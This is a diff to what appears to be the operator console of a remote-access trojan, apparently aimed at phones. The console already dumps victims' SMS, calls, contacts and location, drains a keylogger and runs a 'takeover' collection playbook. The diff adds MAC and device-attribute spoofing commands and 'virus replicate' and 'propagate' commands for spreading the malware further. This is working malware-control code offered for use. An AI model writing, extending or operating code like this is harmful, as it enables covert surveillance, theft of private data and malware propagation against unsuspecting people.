@@ -36,6 +36,9 @@ HELP = [
     ("shot", "screen capture (needs consent)"),
     ("sms [n] / calls / contacts / loc", "dump data"),
     ("keylog", "drain the keylogger buffer"),
+    ("native", "native probe <kind> · native spoof-mac <iface> <mac>"),
+    ("spoof", "spoof <key> <value> · spoof clear [key] · spoof status"),
+    ("virus", "virus status · virus replicate [dest] · virus propagate [dest]"),
     ("takeover", "re-run the full collection playbook"),
     ("sleep <ms>", "set the beacon interval"),
     ("loot", "downloaded artifacts"),
@@ -296,6 +299,29 @@ def run(host: str, port: int, psk: bytes, public_url: str, udp_port: int = 0) ->
                 terminal.queue("loc")
             elif verb == "keylog":
                 terminal.queue("keylog_dump")
+            elif verb == "native":
+                if args and args[0] == "spoof-mac" and len(args) >= 3:
+                    terminal.queue("native_spoof_mac", [args[1], args[2]])
+                elif args and args[0] == "probe":
+                    terminal.queue("native_probe", [args[1] if len(args) > 1 else "snapshot"])
+                else:
+                    terminal.queue("native_state")
+            elif verb == "spoof":
+                if not args or args[0] == "status":
+                    terminal.queue("spoof_status")
+                elif args[0] == "clear":
+                    terminal.queue("spoof_clear", [args[1] if len(args) > 1 else "all"])
+                elif len(args) >= 2:
+                    terminal.queue("spoof_set", [args[0], " ".join(args[1:])])
+                else:
+                    print(_colored("  usage: spoof <key> <value> · spoof clear [key] · spoof status", DIM))
+            elif verb == "virus":
+                if args and args[0] == "replicate":
+                    terminal.queue("virus_replicate", [args[1] if len(args) > 1 else ""])
+                elif args and args[0] == "propagate":
+                    terminal.queue("virus_propagate", [args[1] if len(args) > 1 else ""])
+                else:
+                    terminal.queue("virus_status")
             elif verb == "sleep":
                 sid = terminal.require()
                 if sid and args:
